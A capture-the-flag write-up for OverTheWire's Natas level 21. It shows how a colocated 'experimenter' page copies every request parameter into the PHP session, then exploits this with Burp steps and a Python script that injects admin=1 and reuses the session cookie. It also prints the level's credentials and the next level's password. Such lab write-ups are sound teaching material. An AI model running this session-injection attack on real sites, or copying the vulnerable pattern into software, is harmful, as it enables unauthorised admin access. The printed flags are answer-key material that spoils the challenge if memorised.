# Natas Level 21 Writeup (natas21) – OverTheWire

## Overview

This level focuses on exploiting a **session manipulation** vulnerability.
The goal is to get admin access and find the password for the next level.

## Observation

When we open the page, we see:

> **"This website is colocated with http://natas21-experimenter.natas.labs.overthewire.org"**

There is also a link to view the source code:

```text
index-source.html
```

The source code checks whether:

```php
$_SESSION["admin"] == 1
```

So we need to add `admin=1` to the session.

## Finding the Password

### Using Browser & BurpSuite

1. Open the **natas21-experimenter** website and view its source code.

2. We find:

   ```php
   if(array_key_exists("submit", $_REQUEST)) {
       foreach($_REQUEST as $key => $val) {
           $_SESSION[$key] = $val;
       }
   }
   ```

3. This means we can add our own value to the session by sending:

   ```text
   admin=1
   ```

4. Now send **natas21-experimenter** request to `Repeater` then add our own value and send. Copy the `PHPSESSID`, Don't forget it.
```text
align=center&fontsize=100%25&bgcolor=blue&submit=Update&admin=1
```

5. Also send **natas21** request to `Repeater` then change `PHPSESSID` that we copied. Send updated request.

#### Proof

```text
Username: natas22
Password: 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF
```

### Using Python

```python
import requests, re

target = 'http://natas21.natas.labs.overthewire.org/'
experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php'
auth = ('natas21', '7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU')

session = requests.Session()

params = {
    'align': 'center',
    'fontsize': '100%',
    'bgcolor': 'yellow',
    'submit': 'Update',
    'admin' : 1
}

r = session.post(experimenter, auth=auth, params=params)
session_id = r.cookies['PHPSESSID']

r = session.get(target, auth=auth, cookies={'PHPSESSID': session_id})

match = re.search(r'Password:\s(\w{32})', r.text)
print(f"Password for next level is: {match.group(1)}")
```

## Vulnerability

The experimenter website stores **all request parameters directly in the session**.

## Flag

`964laB0r7TuDqJj5b3HFtwsQoc0GhjBF`
